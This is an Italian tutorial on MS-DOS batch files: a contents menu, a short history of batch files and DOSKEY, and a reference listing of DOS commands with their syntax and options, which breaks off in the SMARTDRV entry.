============[ MENU ]=============================

-1- COSA SONO I BATCH?
-2- COSA MI SERVE PER SCRIVERE UN BATCH?
-3- INIZIAMO A CAPIRE QUALCOSA
-4- L'USO DEI CARATTERI JOLLY
-5- IL COMANDO "ECHO"
-6- SCRIVIAMO IL NOSTRO PRIMO BATCH
-7- FACCIAMO PARTIRE IL NOSTRO BATCH
-8- INVENTIVA
-9- REDIREZIONARE L'OUTPUT
-10- L'USO DEL PIPELINE
-11- L'USO DEL COMANDO "FOR"
-12- L'USO DELL' IF EXIST / IF NOT EXIST 
-13- L'USO DI "GOTO"
-14- L'USO DI "REM"
-15- L'USO DI "CHOICE"
-16- IL CARATTERE FANTASMA ALT 255
-17- IL MISTERO (O IL BUG?) DEL CESTINO BASTARDO
-18- UN ESEMPIO DI BATCH CREATO DA ME
-19- RUNDLL32 - LE FUNZIONI OCCULTATE
-20- UNA MOSTRUOSITA'
-21- TIRANDO LE SOMME

=================================================



-=< 1 >=- COSA SONO I BATCH ?

Tempo fa (parliamo di anni), le interfacce grafiche non erano molto diffuse
e i sistemi operativi erano per lo piu' a stringa di testo, come ad esempio
Microsoft MsDos®.

Chi doveva lavorare con sistemi come questi aveva una problematica principa
le, cioè il continuare a ripetere le stesse operazioni più e più volte.
Ad esempio, se ad ogni sessione l'utente necessitava di spostare delle cart
elle, dei files o qcs altro, doveva continuare a digitare dei comandi molto
ripetitivi.

Per questo motivo sono stati introdotti due modi di velocizzare il lavoro.
Le "DOSKEY" e i "BATCH".

Le DOSKEY consistevano nel caricare in memoria una sequenza di comandi da
poter caricare digitando un nome prefissato. Voglio dire , potevo decidere
che digitando "lavora" il computer si mettesse a spostarmi una cartella o
a eliminarmi dei files inutili.
Le DOSKEY pero' andavano ripristinate ad ogni avvio del computer, e per qu
esto non vennero molto usate.

L'altro modo, quello che ci interessa, sono i BATCH.
I BATCH sono dei piccolissimi files con estensione .BAT che racchiudono al
l'interno dei comandi di DOS. Una volta avviati, eseguono tutti quei coman
di di fila e si arrestano soltanto premendo Ctrl+C.
La differenza sostanziale con le DOSKEY è che i batch sono FILES mentre le
DOSKEY no. E i BATCH restano ... eccome se restano!


-=< 2 >=- COSA MI SERVE PER SCRIVERE UN BATCH

Va benone il Prompt di MsDos o un qualsiasi editor di testo BASICO come il
diffusissimo NOTEPAD. Ahem ... WORD non va bene! Er mejo resta MsDos, cmq.


-=< 3 >=- INIZIAMO A CAPIRE QUALCOSA

Qua di seguito voglio listare tutti i comandi di MsDos, anche perchè se no
n conoscete a fondo i comandi principali , col ca##o che farete dei grandi
BATCH!

MS-DOS, come gli altri sistemi eperativi, gestisce il flusso di informazio
ni tra le varie parti del sistema. Quando si digita o si sceglie un comand
o per indicare al sistema di eseguire una determinata operazione, si utili
zza MS-DOS. Le versioni piu' recenti del sistema operativo della Microsoft
( dalla ver. 5.0 alla 6.22, ma anche la ver. 7.0 contenuta in Windows 9.x)
consentono di gestire file e directory, curare la manutenzione dei dischi,
ottimizzare l'uso della memoria, velocizzare i programmi.


Qui di seguito sono riportati i comandi di uso comune. 

ATTRIB Visualizza o modifica gli attributi dei file.
CD Cambia la directory corrente o ne visualizza il nome.
CHDIR Cambia la directory corrente o ne visualizza il nome. 
CHKDSK Verifica il disco e visualizza una relazione sul suo stato.
CLS Cancella il contenuto della schermata. 
COMMAND Avvia un nuovo inteprete dei comandi MS-DOS.
COPY Copia uno o piu' file in un altro punto del disco.
DEFRAG Riorganizza i file su un disco per ottimizzarne l'uso. 
DEL Elimina uno o piu' file. 
DELTREE Elimina una directory e tutti i file e le sottodirectory in essa contenuti. 
DIR Visualizza l'elenco dei file e delle subdirectory di una directory. 
DISKCOPY Copia il contenuto di un disco floppy in un altro disco floppy. 
DOSKEY Modifica righe di comando, chiama comandi di MS-DOS e crea macro. 
EDIT Avvia MS-DOS Editor per creare e modificare i file ASCII. 
EMM386 Abilita o disabilita la memoria espansa di EMM386. 
EXPAND Decomprime uno o piu' file compressi. 
FDISK Configura un disco rigido per l'utilizzo con MS-DOS.
FORMAT Formatta un disco per l'utilizzo con MS-DOS. 
KEYB Configura la tastiera per la lingua specificata. 
LABEL Crea, modifica o elimina l'etichetta di volume di un disco.
MD Crea una nuova directory. 
MEM Visualizza la quantità di memoria usata e libera del sistema. 
MKDIR Crea una nuova directory. 
MORE Visualizza i dati di output una schermata per volta. 
PATH Visualizza o imposta un percorso di ricerca per i file eseguibili.
PRINT Stampa un file di testo consentendo di usare altri comandi di MSDOS. 
PROMPT Cambia il prompt dei comandi di MS-DOS. 
RD Rimuove una directory. 
REN Rinomina uno o piu' file. 
RENAME Rinomina uno o piu' file. 
REPLACE Sostituisce i file. 
RMDIR Rimuove una directory. 
SUBST Associa un percorso ad una lettera di unità.
SYS Copia i file di sistema di MS-DOS e l'inteprete dei comandi sul disco specificato.
TYPE Visualizza il contenuto di un file di testo. 
UNDELETE Ripristina i file cancellati precedentemente con il comando DEL.
UNFORMAT Ripristina i dati di un disco cancellati con il comando FORMAT. 
VER Visualizza la versione di MS-DOS in uso. 
VOL Visualizza l'etichetta e il numero di serie di volume del disco.
XCOPY Copia i file (ad esclusione dei file nascosti e di sistema) e la struttura delle directory. 








ATTRIB


Visualizza o modifica gli attributi dei file. 
Questo comando visualizza, imposta o rimuove gli attributi assegnati ai file 
e alle directory, quali l'attributo di sola lettura, di archivio, di file di 
sistema e di file nascosto. 
Sintassi 

ATTRIB [+R|-R] [+A|-A] [+S|-S] [+H|-H][[unita':][percorso]nomefile] [/S] 

Per visualizzare tutti gli attributi di tutti i file presenti nella 
directory corrente, utilizzare la seguente sintassi: 

ATTRIB 

Opzioni 
+R Imposta l'attributo di sola lettura. 
-R Disattiva l'attributo di sola lettura. 
+A Imposta l'attributo archivio. 
-A Disattiva l'attributo archivio. 
+S Imposta il file come file di sistema. 
-S Disattiva l'attributo di file di sistema. 
+H Imposta il file come file nascosto. 
-H Disattiva l'attributo di file nascosto. 
/S Elabora i file presenti nella directory corrente ed in tutte le 
sottodirectory. 




DISKCOPY


Copia il contenuto di un disco floppy nell'unita' di origine su un floppy 
formattato o non formattato inserito nell'unita' di destinazione. Il comando 
DISKCOPY cancella il contenuto del disco di destinazione sovrascrivendovi i 
nuovi dati. 
Questo comando determina il numero di facce da copiare in base all'unita' e 
al disco di origine. 
Sintassi 

DISKCOPY [unita'1: [unita'2:]] [/1] [/V] [/M] 

Opzioni 
/V Verifica che le informazioni vengano copiate correttamente. L'utilizzo 
di questa opzione rallenta l'operazione. 
/M Indica a DISKCOPY di usare solo memoria convenzionale per memorizzazioni 
provvisorie. DISKCOPY usa di solito il disco rigido per tale operazione, 
sicche' non si debbono scambiare i floppy. 




CHDIR (CD)


Visualizza il nome della directory corrente oppure cambia la directory 
corrente. 
Sintassi 

CHDIR [unita':][path] 
CHDIR[..] 
CD [unita':][percorso] 
CD[..] 




CHKDSK


Genera e visualizza una relazione sullo stato del disco e riporta gli errori 
individuati sul disco. 
Il rapporto sullo stato mostra gli errori rilevati nel sistema di 
archiviazione MS-DOS, consistente nella tavola allocazione file e nelle 
directory. Anche CHKDSK fornisce un riepilogo dell'uso del disco. (CHKDSK 
non verifica che le informazioni nei file possano essere lette senza 
errori.) Se vi sono errori su disco, CHKDSK visualizza un messaggio. 
Note: Il programma ScanDisc e' il metodo consigliato per correggere problemi 
su disco, da preferire al comando CHKDSK /F. Per ulteriori 
informazioni, vedere il comando . 
Sintassi 

CHKDSK [unita':][[percorso] nomefile] [/F] [/V] 

Per visualizzare una relazione sullo stato del disco dell'unita' corrente, 
utilizzare la seguente sintassi: 

CHKDSK 

Opzioni 
/F Corregge gli errori su disco. Non utilizzare questa opzione se si sta 
eseguendo CHKDSK da altri programmi. Per ulteriori informazioni, 
consultare "Utilizzo di CHKDSK con file aperti" in . In 
generale, per correggere gli errori del disco, utilizzare 
invece di CHKDSK. 
/V Visualizza il nome di ciascun file contenuto in tutte le directory, 
durante il controllo del disco. 




COPY


Copia uno o piu' file in un'altra posizione. 
Il comando COPY puo' essere utilizzato anche per unire file. Se vengono 
copiati piu' file, MS-DOS visualizza il nome di ciascun file man mano che 
viene copiato. 
Sintassi 

COPY [Y|-Y][/A|/B] origine[/A|/B] [+ origine[/A|/B] [+ 
...]][destinazione [/A|/B]] [/V] 

Opzioni 
/A Indica un file di testo ASCII. L'opzione /A ha effetto su tutti i file 
che essa precede nell'elenco dei nomi di file sulla riga di comando, 
fino a quando COPY non incontra un'opzione /B. In tal caso, l'opzione /B 
ha effetto su tutti i file che la precedono. 
Quando l'opzione /A segue un nome di file, essa avra' effetto su quel 
file e su tutti i file ad essa successivi, fino a quando COPY non 
incontra l'opzione /B. In tal caso, l'opzione /B avra' effetto su tutti i 
file che la precedono. 
Un file di testo ASCII puo' utilizzare il carattere di fine file (CTRL+Z) 
per indicare la fine di un file. Durante l'unione di file, il comando 
COPY considera per definizione i file come file di testo ASCII. 
/B Indica un file binario. L'opzione /B ha effetto su tutti i file che la 
precedono sulla riga di comando, fino a quando il comando COPY non 
incontra un'opzione /A. In tal caso, l'opzione /A avra' effetto su tutti 
i file che la precedono. 
Se l'opzione /B segue un nome di file, essa avra' effetto su quel file e 
su tutti i file ad essa successivi, fino a quando COPY non incontra 
un'opzione /A. In tal caso, l'opzione /A avra' effetto su tutti i file 
che la precedono. 
L'opzione /B specifica che l'interprete dei comandi deve leggere il 
numero di byte specificati dalle dimensioni dei file nella directory. 
L'opzione /B e' il valore predefinito di COPY, tranne quando esso sta 
unendo dei file. 




DEFRAG


Riorganizza i file su un disco per ottimizzare le prestazioni del disco 
stesso. Non utilizzare questo comando durante l'esecuzione di Windows. 
Sintassi 

DEFRAG [unita':] [/F] [/S[:]ordine] [/B] [/SKIPHIGH] [/LCD | /BW | /G0] 
[/H] 

DEFRAG [unita':] [/U] [/B] [/SKIPHIGH] [/LCD | /BW | /G0] [/H] 

Opzioni 
/F Compatta i file e garantisce che nel disco non siano presenti spazi 
vuoti tra i file. 
/U Compatta i file e lascia spazi vuoti, se presenti, tra i file. 
/B Riavvia il computer dopo avere riorganizzato i file. 
/H Sposta file nascosti 




DEL (Erase)


Elimina i file specificati. 
Sintassi 

DEL [unita':][percorso] nomefile [/P] 

Opzione 
/P Chiede conferma prima di eliminare il file specificato. 




DELTREE


Elimina una directory con tutti i file e sottodirectory relative. 
Sintassi 

DELTREE [/Y] [unita':]percorso [[drive:]percorso[...]] 




DIR


Visualizza l'elenco dei file e delle sottodirectory di una directory. 
Quando si utilizza il comando DIR senza parametri od opzioni, esso 
visualizza l'etichetta di volume e il numero di serie del disco. Visualizza 
inoltre una directory o un file per riga, inclusa l'estensione del file, la 
relativa dimensione in byte e l a data e l'ora dell'ultima modifica. Infine, 
il comando riporta il numero totale dei file elencati, la quantita' totale di 
memoria occupata ed il numero di byte lasciati liberi sul disco. 
Sintassi 

DIR [unita':][percorso][nomefile] [/P] [/W] 
[/A[[:]attributi]][/O[[:]tipoordinamento]] [/S] [/B] [/L] [C] 

Opzioni 
/P Visualizza l'elenco una schermata per volta. Per passare alla schermata 
successiva, e' sufficiente premere un tasto. 
/W Visualizza l'elenco in formato ampio, elencando fino a cinque file o 
directory per riga. 
/A[[:] attributi] 
Visualizza solo le directory e i file con gli attributi specificati. Se 
questa opzione viene omessa, il comando DIR visualizza tutti i file 
tranne quelli nascosti e di sistema. Se l'opzione viene utilizzata senza 
specificare gli attributi, DIR visualizza tutti i file, compresi quelli 
nascosti e di sistema. L'elenco che segue descrive ciascuno dei valori 
che e' possibile utilizzare per attributi. I due punti (:) sono 
facoltativi. E' possibile utilizzare una qualsiasi combinazione di 
questi valori senza separarli con spazi. 
H File nascosti 
-H File non nascosti 
S File di sistema 
-S File non di sistema 
D Directory 
-D Solo file (escluse le directory) 
A File pronti per essere archiviati (backup) 
-A File che non sono stati modificati dall'ultimo backup 
R File di sola lettura 
-R File non di sola lettura 




DOSKEY


Doskey e' un programma residente in memoria e viene utilizzato per 
personalizzare e automatizzare la riga di comando MS-DOS. Quando viene 
installato, Doskey occupa circa 3 Kb di memoria residente. 
Sintassi 

DOSKEY [/REINSTALL] [/BUFSIZE=dimensione] [/MACROS] 
[/HISTORY][/INSERT|/OVERSTRIKE] [nomemacro=[testo]] 




EDIT


Avvia MS-DOS Editor che consente di creare e modificare file di testo 
ASCII. 
MS-DOS Editor e' un editor a schermo intero che consente di creare, 
modificare, memorizzare e stampare file di testo ASCII. In MS-DOS Editor 
e' possibile scegliere i comandi da menu e specificare le informazioni e le 
preferenze nelle finestre di dialogo. MS-DOS Editor comprende un'ampia Guida 
in linea per richiedere informazioni relative alle sue procedure ed ai suoi 
comandi. 
Sintassi 

EDIT [[unita':][percorso]nomefile] [/B] [/G] [/H] [/NOHI] 

ATTENZIONE: Per poter utilizzare MS-DOS Editor e' necessario che il file 
QBASIC.EXE si trovi nella directory corrente, nel relativo 
percorso di ricerca o nella stessa directory del file EDIT.COM. 
Se il file QBASIC.EXE viene eliminato per liberare spazio sul 
disco, MS-DOS Editor non potra' essere eseguito. 




EMM386


Abilita o disabilita il supporto di memoria espansa EMM386 su un computer 
con processore 80386 o superiore. 
Il comando EMM386 abilita o disabilita anche il supporto del coprocessore 
Weitek. Non utilizzare questo comando durante l'esecuzione di Windows. Esso 
inoltre provvede supporto di memoria espansa e accesso alla memoria 
superiore. Per un'introduzione sull'utilizzo dei driver di periferica 
EMM386.EXE, vedere . 
Sintassi 

EMM386 [ON|OFF|AUTO] 

Per visualizzare lo stato attuale del supporto di memoria espansa EMM386, 
utilizzare la sintassi seguente: 

EMM386 

Parametri 
ON|OFF|AUTO 
Attiva il driver di periferica EMM386.EXE (se impostato su ON), sospende 
il driver di periferica EMM386.EXE (se impostato su OFF) oppure 
posiziona il driver di periferica EMM386.EXE in modalita' automatica (se 
impostato su AUTO). La modalita' automatica abilita il supporto di 
memoria espansa solamente quando un programma lo richiede. Il valore 
predefinito ON. 




EXPAND


Espande un file compresso. E' possibile utilizzare questo comando per 
recuperare uno o piu' file dai dischi di installazione o di aggiornamento 
inclusi nel pacchetto di MS-DOS 6.22. I file non possono essere utilizzati 
finche' non vengono decompressi. 
Sintassi 

EXPAND [unita':][percorso]nomefile [[unita':][percorso]nomefile[...]] 
destinazione 

Se viene digitato quanto segue, EXPAND chiedera' di immettere la posizione 
e/o il nome che si desidera assegnare al file espanso: 

EXPAND [unita':][percorso]nomefile 

EXPAND chiedera' di immettere la posizione e il nome del file compresso da 
espandere, quindi la posizione e/o il nome da assegnare al file espanso, se 
si digita quanto segue: 

EXPAND 




FDISK


Avvia il programma Fdisk, che configura il disco rigido per l'utilizzo di 
MSDDOS. 
Fdisk visualizza una serie di menu per facilitare la suddivisione in 
partizioni del disco rigido per MSDDOS. 
Per avviare il programma di Fdisk, seguire questa sintassi: 

FDISK 

Per visualizzare le informazioni sulla partizione senza avviare il programma 
Fdisk, utilizzare la seguente sintassi: 

FDISK /STATUS 

Opzioni 
/STATUS 
Visualizza una panoramica delle partizioni del disco rigido del 
computer, senza avviare il programma Fdisk. 




FORMAT


Formatta il disco nell'unita' specificata per accettare i file di MSDDOS. 
Il comando FORMAT crea una nuova directory principale e una tabella di 
assegnazione dei file per il disco. E' anche possibile controllare le aree 
danneggiate sul disco ed eliminare tutti i dati sul disco. Per consentire a 
MSDDOS di utilizzare un disco nuovo, utilizzare innanzi tutto questo comando 
per formattare il disco. 
Sintassi 

FORMAT unita': [/V[:etichetta]] [/Q] [/U] [/F:dimensione][/B|/S] [/C] 
FORMAT unita': [/V[:etichetta]] [/Q] [/U] [/T:tracce /N:settori] [/B|/S] 
[/C] 
FORMAT unita': [/V[:etichetta]] [/Q] [/U] [/1] [/4] [/B|/S] [/C] 
FORMAT unita': [/Q] [/U] [/1] [/4] [/8] [/B|/S] [/C] 

Avvertenza: Non formattare un disco floppy in misura maggiore a quella 
attribuitagli. 
Se il disco e' stato formattato e non si sta utilizzando il parametro /U, 
la vecchia tabella di assegnazione dei file e la directory principale 
verranno salvate per poter annullare la formattazione del disco. Se 
e' stato formattato il disco sbagliato utilizzare il comando il 
piu' presto possibile. 

Opzioni 
/Q Specifica una formattazione veloce di un disco. Tramite questa opzione, 
FORMAT elimina la tabella di assegnazione dei file (FAT) e la directory 
principale di un disco formattato in precedenza, ma non esamina il disco 
per verificare la presenza di aree danneggiate. Si dovrebbe utilizzare 
l'opzione /Q per formattare solo dischi gia' formattati in precedenza che 
non sono sicuramente danneggiati. 
/U Specifica un'operazione di formattazione incondizionata per un disco 
floppy o un disco rigido. La formattazione incondizionata distrugge 
tutti i dati esistenti sul disco ed impedisce di annullare la 
formattazione in un secondo tempo. E' consigliabile utilizzare /U se 
sono stati visualizzati messaggi di errori di lettura e di scrittura 
durante l'utilizzo del disco. Per informazioni relative alla non 
formattazione dei dischi, vedere il comando UNFORMAT. 
/F:size 
Specifica la dimensione del disco floppy da formattare. Se possibile, 
utilizzare questa opzione, invece delle opzioni /T e /N. Utilizzare uno 
dei seguenti valori per la dimensione: 720, 1440 . 
/B Riserva dello spazio per i file di sistema IO.SYS e MSDOS.SYS su un 
disco appena formattato (come file nascosti). Nelle versioni precedenti 
di MSDDOS, era necessario riservare questo spazio prima di utilizzare il 
comando SYS per copiare i file di sistema sul disco. Questa opzione 
viene mantenuta MSDDOS versione 6.0 solo per ragioni di compatibilita'. 
/S Copia i file di sistema in uso IO.SYS, MSDOS.SYS e COMMAND.COM 
dall'unita' disco di avvio del sistema su un disco formattato che puo' 
essere utilizzato come disco di sistema. Se FORMAT non riesce a trovare 
i file di sistema in uso, richiede l'inserimento di un disco di 
sistema. 
/C Ricontrolla i cluster danneggiati. Per impostazione predefinita, se 
un'unita' contiene cluster segnati come "danneggiati" FORMAT non 
ricontrolla i cluster; li lascia semplicemente segnati come 
"danneggiati". Utilizzare l'opzione /C se si desidera che FORMAT 
ricontrolli tutti i cluster danneggiati sull'unita'. (Nelle versioni 
precedenti di MS-DOS FORMAT ricontrollava sempre i cluster 
danneggiati.) 


KEYB


Avvia il programma Keyb che configura una tastiera in base ad una lingua 
specifica. 
Utilizzare Keyb per configurare una tastiera per una lingua diversa 
dall'inglese statunitense. Per un'introduzione al programma Keyb, vedere il 
capitolo "Personalizzazione per uso internazionale"nel Manuale dell'utente 
di MS-DOS. 
Sintassi 
Al prompt dei comandi utilizzare la seguente sintassi: 

KEYB [xx[,[yyy][,[unita' disco:][percorso]nomefile]]] [/E] [/ID:nnn] 

Parametri 

xx 
Specifica il codice della tastiera. Vedere la tabella alla fine 
dell'argomento per un elenco dei valori validi per questo parametro. 
yyy 
Specifica la tabella codici. Vedere la tabella alla fine dell'argomento 
per un elenco dei valori validi per questo parametro. Se non viene 
specificato un valore, KEYB utilizza la tabella codici corrente. 
[unita':][percorso]nomefile 
Specifica la posizione ed il nome del file di definizione della 
tastiera. Il nome del file predefinito e' KEYBOARD.SYS. Se KEYBOARD.SYS 
si trova in una directory inclusa nel percorso, non sara' necessario 
specificare questo parametro. (MS-DOS 6.22 include due file di 
definizione della tastiera: il file predefinito KEYBOARD.SYS, e 
KEYBRD2.SYS, che fornisce supporto per tastiere non incluse in 
KEYBOARD.SYS. Per informazioni sull'utilizzo di KEYBRD2.SYS, vedere il 
file COUNTRY.TXT file.) 

[unita'-dos:]percorso dos 
Specifica la posizione del file KEYB.COM. 

Opzioni 
/E Indica che la tastiera installata e' avanzata. tale 
opzione risulta utile se si utilizza una tastiera 
avanzata su un computer 8086. 
/ID:nnn 
Specifica il tipo di tastiera in uso. Questa opzione 
e' necessaria solo per i paesi che hanno piu' schemi di 
tastiera per la stessa lingua (Francia, Italia e Regno 
Unito). Vedere la tabella seguente per un elenco dei 
valori validi per nnn. 
La seguente tabella elenca i valori validi per xx, yyy e nnn per ogni paese 
o lingua supportata da KEYBOARD.SYS:

Tabella Identificazione codici della tastiera 
Paese o lingua Codice di Keyb (valore xx) (valore yyy) (valore ID:nnn) 

Italia it 850, 141, 142 437 
Stati Uniti us 850, 437 

Questo elenco include solo tastiere supportate dal file KEYBOARD.SYS. 




LABEL


Crea, modifica o elimina l'etichetta di volume (nome) di un disco. 
MS-DOS visualizza l'etichetta di volume all'interno dell'elenco della 
directory. MS-DOS visualizza anche il numero di serie del volume, se e' 
disponibile. 
Sintassi 

LABEL [unita':][etichetta] 

Per indicare a MS-DOS di visualizzare l'etichetta di volume ed il numero di 
serie correnti, se esistono, e di richiedere l'immissione di un'etichetta o 
l'eliminazione di quella esistente, utilizzare la seguente sintassi: 

LABEL 




MEM


Visualizza la quantita' di memoria utilizzata e la quantita' di memoria libera 
nel sistema. 
E' possibile utilizzare il comando MEM per visualizzare le informazioni 
relative alle aree di memoria utilizzate, alle aree di memoria libere ed ai 
programmi caricati in memoria. 
Sintassi 

MEM [/CLASSIFY|/DEBUG|/FREE|/MODULE nomemodulo] [/PAGE] 

Per visualizzare lo stato della memoria utilizzata e della memoria libera 
del sistema, utilizzare la seguente sintassi: 

MEM 

Opzioni 
/CLASSIFY 
Elenca i programmi che sono stati caricati effettivamente nella memoria 
e visualizza la quantita' di memoria convenzionale e di memoria superiore 
utilizzata da ogni programma. MEM /CLASSIFY fornisce anche un sommario 
dell'utilizzo di memoria ed elenca i blocchi di memoria piu' grandi a 
disposizione. E' possibile utilizzare l'opzione /CLASSIFY con /PAGE, ma 
non con altre opzioni di MEM. L'opzione /CLASSIFY si puo' abbreviare in 
/C. 
/FREE 
Elenca le aree di memoria convenzionale e superiore libere. MEM /FREE 
visualizza l'indirizzo del segmento, la dimensione di ogni area di 
memoria convenzionale libera e il blocco piu' grande libero in ogni area 
di memoria superiore. E' possibile utilizzare l'opzione /FREE con /PAGE, 
ma non con altre opzioni di MEM. Si puo' abbreviare /FREE in /F. 
/PAGE 
Fa una pausa dopo ogni schermata di output. Questa opzione puo' essere 
utilizzata con altre opzioni di MEM. 




MKDIR (MD)


Crea una directory. 
E' possibile utilizzare il comando MKDIR per creare una struttura di 
directory su piu' livelli. 
Sintassi 

MKDIR [unita':]percorso 

MD [unita':]percorso 




MSCDEX


Fornisce accesso alle unita' CD-ROM. MSCDEX puo' essere caricato dal file 
AUTOEXEC.BAT o dal prompt dei comandi. Il driver di periferica che fa parte 
dell'unita' CD-ROM deve essere caricato dal file CONFIG.SYS. Per maggiori 
informazioni, vedere l'argomento Nota. 
Il comando MSCDEX non dovrebbe essere utilizzato dopo che Windows e' stato 
avviato. 
Sintassi 

MSCDEX /D:periferica [/D:periferica2... ] [/E] [/K] [/S] [/V] 
[/L:lettera] [/M:numero] 

Parametri 
/D:periferica1 [/D:periferica2... ] 
Specifica la signature del driver del primo driver di periferica CD-ROM. 
Il parametro periferica1 deve coincidere con il parametro speicificato 
dall'opzione /D sul comando CONFIG.SYS che avvia il driver di periferica 
corrispondente CD-ROM. 
Il comando MSCDEX deve includere almeno un'opzione /D. Per installare 
dei driver di periferica CD-ROM addizionali, specificare un'opzione 
addizionale /D per ciascun driver. 
/E Specifica che il driver CD-ROM deve essere predisposto in modo da 
espandere memoria, se ne esiste disponibile, per archiviare dei buffer 
di settore. 
/V Indica a MSCDEX di visualizzare delle statistiche di visualizzazione 
della memoria quando viene avviato. 
/L:lettera 
Specifica le lettere dell'unita' da assegnare alla prima unita' CD-ROM. Se 
si ha piu' di un'unita' CD-ROM, MS-DOS assegna delle unita' addizionali 
conseguenti alle lettere dell'unita' disponibili. 
/M:numero 
Specifica il numero di buffer di settore. 




PATH


Imposta un percorso di ricerca per file eseguibili. 
MS-DOS utilizza il comando PATH per cercare i file eseguibili nelle 
directory specificate. Il percorso di ricerca predefinito e' solo la 
directory corrente. 
Sintassi 

PATH [[unita':]percorso[;...]] 

Per visualizzare il percorso di ricerca corrente, utilizzare la sintassi 
seguente: 

PATH 

Per eliminare tutte le impostazioni dei percorsi di ricerca e lasciare 
soltanto quella predefinita (la directory corrente), utilizzare la seguente 
sintassi: 

PATH ; 

Quando e' specificato da solo, elimina tutte le impostazioni dei percorsi 
e indica a MS-DOS di ricercare soltanto nella directory corrente. 




PRINT


Stampa un file di testo durante l'elaborazione di altri comandi MS-DOS. 
Se si dispone di una periferica di output, collegata ad una delle porte 
seriali o parallele del sistema, con il comando PRINT sara' possibile 
stampare in background. 
Sintassi 

PRINT [/D:periferica] [/B:dimensioni] [/U:tic1] [/M:tic2] [/S:tic3] 
[/Q:dimensionicoda] [/T] [[unita':][percorso] nomefile[ ...]] [/C] [/P] 

Per installare il comando PRINT utilizzando i parametri predefiniti o per 
visualizzare il contenuto della coda di stampa senza modificarla, la 
sintassi sara' la seguente: 

PRINT 

Opzioni 
/D:periferica 
Specifica il nome della periferica di stampa. I valori validi delle 
porte parallele sono LPT1, LPT2 e LPT3. I valori validi delle porte 
seriali sono COM1, COM2, COM3 e COM4. Il valore predefinito e' PRN. I 
valori PRN e LPT1 si riferiscono alla stessa porta parallela. L'opzione 
/D deve precedere il nome di qualsiasi file sulla riga di comando. 
/T Elimina tutti i file dalla coda di stampa. 




PROMPT


Modifica l'aspetto del prompt dei comandi di MS-DOS. 
E' possibile personalizzare l'aspetto del prompt dei comandi in maniera tale 
da visualizzare una qualsiasi stringa di testo, con informazioni quali il 
nome della directory corrente, l'ora e la data e il numero della versione di 
MS-DOS. 
Sintassi 

PROMPT [testo] 

Testo 

$Q = (segno di uguale) 
$$ $ (simbolo del dollaro) 
$T Ora corrente 
$D Data corrente 
$P Unita' e percorso corrente 
$V Numero della versione di MS-DOS 
$N Unita' corrente 
$G > (segno di maggiore) 
$L < (segno di minore) 
$B | (pipe) 
$_ INVIO-NUOVA RIGA 
$E Il codice escape ASCII (codice 27) 
$H BACKSPACE (elimina un carattere che e' stato 
scritto sulla riga di prompt) 




RENAME (REN)


Cambia il nome di uno o piu' file. 
E' possibile assegnare un nuovo nome a tutti i file che corrispondono al 
nome specificato. Non e' possibile utilizzare questo comando per assegnare un 
nuovo nome a file di unita' diverse o per spostarli in nuove directory. Per 
rinominare le sottodirectory o spostare i file, utilizzare il comando 
. 
Sintassi 

RENAME [unita':][percorso]nomefile1 nomefile2 

REN [unita':][percorso]nomefile1 nomefile2 




RMDIR (RD)


Elimina (rimuove) una directory. 
Prima di eliminare una directory, e' necessario eliminare prima tutti i file 
e le sottodirectory contenuti in essa. La directory deve essere vuota, fatta 
eccezione per i simboli "." e "..". 
Sintassi 

RMDIR [unita':]percorso 

RD [unita':]percorso 




SCANDISK


Avvia Microsoft ScanDisk, un'utilita' di scansione e ripristino che controlla 
una data unita' per rilevare degli errori e correggere eventuali problemi. 
Per un'introduzione all'uso di ScanDisk, consultare 
. 
Sintassi 

Usare la sintassi seguente per controllare eventuali errori su disco: 

SCANDISK 

Usare la sintassi seguente per controllare eventuali errori su due o piu' 
dischi: 

SCANDISK [unita': [unita': ...]|/ALL] [/CHECKONLY | /AUTOFIX [/NOSAVE] | 
CUSTOM] [/SURFACE] [/MONO] [/NOSUMMARY] 

Opzioni 
/ALL Controlla e ripristina tutte le unita' locali. 
/AUTOFIX 
Corregge gli errori senza chiedere prima conferma. Per impostazione 
predefinita, avviando ScanDisk con l'opzione /AUTOFIX tutti i cluster 
persi rilevati sull'unita', verranno salvati come file nella directory 
principale dell'unita'. Per fare in modo che ScanDisk elimini i cluster 
persi invece di salvarli, includere l'opzione /NOSAVE. Utilizzando 
l'opzione /AUTOFIX, se vengono rilevati errori verra' richiesto un disco 
Undo. Per evitarlo, includere l'opzione /NOSUMMARY. Non e' possibile 
utilizzare l'opzione /AUTOFIX unitamente alle opzioni /CHECKONLY o 
/CUSTOM. 
/CHECKONLY 
Controlla una data unita' per rilevarvi degli errori, ma non li corregge. 
Non si puo' usare questa opzione unitamente alle opzioni /AUTOFIX or 
/CUSTOM. 
/NOSAVE 
Fa in modo che ScanDisk elimini tutti i cluster persi rilevati. Puo' 
essere utilizzato solo unitamente all'opzione /AUTOFIX. (Se si avvia 
ScanDisk con l'opzione /AUTOFIX omettendo l'opzione /NOSAVE, ScanDisk 
salvera' il contenuto dei cluster persi come file nella directory 
principale dell'unita'.) 
/SURFACE 
Esegue automaticamente una scansione della superficie dell'unita' dopo 
aver controllato altre aree. Con una scansione della superficie di 
un'unita' non compressa, ScanDisk conferma che i dati possono essere 
scritti e letti con sicurezza. Con la scansione di un'unita' compressa 
ScanDisk conferma che i dati possono essere decompressi. E' 
consigliabile esaminare periodicamente la superficie di tutte le unita'. 
In base all'impostazione predefinita, una volta terminato l'esame del 
file system di una data unita', ScanDisk chiede se si desidera effettuare 
una scansione della superficie. Con l'opzione /SURFACE tale scansione 
viene effettuata senza chiedere conferma. Se si usa /SURFACE unitamente 
all' opzione /CUSTOM esso ha la precedenza sulle impostazioni di 
Superficie nella sezione [Custom] del file SCANDISK.INI. 




SMARTDRV


Avvia o configura il programma SMARTDrive il quale crea una cache del disco 
nella memoria estesa. Una cache del disco puo' velocizzare in modo 
significativo le operazioni di MS-DOS. Quando viene utilizzato per 
l'operazione di caching del disco, SMARTDrive viene caricato utilizzando il 
comando SMARTDRV nel file AUTOEXEC.BAT o al prompt dei comandi. 
SMARTDrive puo' anche eseguire un doppio buffering, il quale e' compatibile 
per i controller del disco rigido che non possono funzionare con la memoria 
fornita da EMM386 o Windows eseguito in modalita' 386 avanzata. Per 
utilizzare il doppio buffering, caricare il driver di periferica 
utilizzando un comando DEVICE nel file CONFIG.SYS. 
Il comando SMARTDRV non sara' caricato dopo che Windows e' stato avviato. 
Sintassi 

Quando si avvia SMARTDrive dal file AUTOEXEC.BAT o dal prompt dei comandi, 
utilizzare la seguente sintassi: 

[unita':][percorso]SMARTDRV [/X] [[unita'[+|-]]...] [/U] [/C|/R] [/F|/N] 
[/L] [/V|/Q|/S] [DimCacheIniz][DimCacheWin]] [/E:DimElemen] 
